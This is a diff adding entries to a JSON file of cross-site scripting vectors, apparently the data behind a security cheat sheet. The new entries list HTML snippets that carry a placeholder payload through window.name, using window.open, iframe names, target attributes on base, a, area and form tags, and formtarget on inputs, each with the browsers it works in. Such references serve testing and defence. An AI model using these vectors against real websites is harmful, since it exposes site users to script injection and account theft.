@@ -62,5 +62,84 @@
             "edge",
             "safari"
         ]
+    },
+    {
+        "description": "Set window.name via parameter on the window.open function",
+        "code": "<script>window.open(\"#\",\"PAYLOAD\")</script>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ]
+    },
+    {
+        "description": "Set window.name via name attribute in a <iframe> tag",
+        "code": "<iframe name=\"PAYLOAD\" src=\"#\"></iframe>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ]
+    },
+    {
+        "description": "Set window.name via target attribute in a <base> tag",
+        "code": "<base target=\"PAYLOAD\"><a href=\"#\">XSS via target in base tag</a>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ]
+    },
+    {
+        "description": "Set window.name via target attribute in a <a> tag",
+        "code": "<a target=\"PAYLOAD\" href=\"#\">XSS via target in a tag</a>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ]
+    },
+    {
+        "description": "Set window.name via usemap attribute in a <img> tag",
+        "code": "<img src=\"#\" width=\"10\" height=\"10\" usemap=\"#xss\"><map name=\"xss\"><area shape=\"rect\" coords=\"0,0,82,126\" target=\"PAYLOAD\" href=\"#\"></map>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ]
+    },
+    {
+        "description": "Set window.name via target attribute in a <form> tag",
+        "code": "<form action=\"#\" target=\"PAYLOAD\"><input type=\"submit\" value=\"XSS via target in a form\"></form>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ]
+    },
+    {
+        "description": "Set window.name via formtarget attribute in a <input> tag type submit",
+        "code": "<form><input type=\"submit\" formaction=\"#\" formtarget=\"PAYLOAD\" value=\"XSS via formtarget in input type submit\"></form>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ]
+    },
+    {
+        "description": "Set window.name via formtarget attribute in a <input> tag type image",
+        "code": "<form><input type=\"image\" src=\"\" formaction=\"#\" formtarget=\"PAYLOAD\" value=\"XSS via formtarget in input type image\"></form>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "safari"
+        ]
     }
 ]
